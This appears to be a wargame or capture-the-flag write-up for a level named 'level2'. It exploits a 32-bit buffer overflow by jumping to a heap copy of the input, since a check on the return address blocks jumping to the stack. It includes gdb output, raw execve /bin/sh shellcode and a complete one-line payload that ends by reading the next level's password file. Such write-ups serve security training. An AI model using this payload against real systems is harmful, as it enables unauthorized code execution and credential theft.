# Shell code into the heap

### Look for seg fault

```bash
pattern create 
Program received signal SIGSEGV, Segmentation fault.
0x61616175 in ?? ()
pattern offset 0x61616175
[+] Found at offset 80 (little-endian search) likely
```

### Nx disable

Nx is disable so first idea was to create and exectue a shell code into the stack

[Shell code tuto and Explanation <-]()

First step consist finding the buffer address

```bash
gef➤  x/20wx $esp
0xffffd280:	0xffffd29c	0xffffffff	0x08048034	0xf7fc66d0
0xffffd290:	0xf7ffd608	0x00000020	0x00000000	0x41414141
0xffffd2a0:	0x41414141	0x41414141	0x41414141	0x41414141

```
buffer start a ```ffffd29c```

:warning: BUT !

```c
   0x080484f8 <+36>:	mov    -0xc(%ebp),%eax
   0x080484fb <+39>:	and    $0xb0000000,%eax
   0x08048500 <+44>:	cmp    $0xb0000000,%eax
   0x08048505 <+49>:	jne    0x8048527 <p+83>
```

This cmp avoids us to point to the return address (0xbf000000 - 0xbfffffff range) and unfortunately, buffer his.

### No matter exec on the stack when we can exec on the heap

In gdb if you put a breakpoint after the strdup fucntion, eax store a pointer to the string allocated.

```c
b *p+105
r
allo
$eax            0x804a008	134520840
```

So if we jump to this address, and put shell code before, we can execute code.

### Payload

payload = shell code + nop instruction * (padding - shellcode.lenght) + address of buffer

```\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80```

[shell code from](http://shell-storm.org/shellcode/files/shellcode-575.html)

syze of shell code : (21 bytes).

So final Buffer is : 

```bash
cat <(python2.7 -c "import sys; sys.stdout.write(b'\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' +  b'\x90' * 59 + b'\x08\xa0\x04\x08')") - | ./level2
cat /home/user/level3/.pass
```
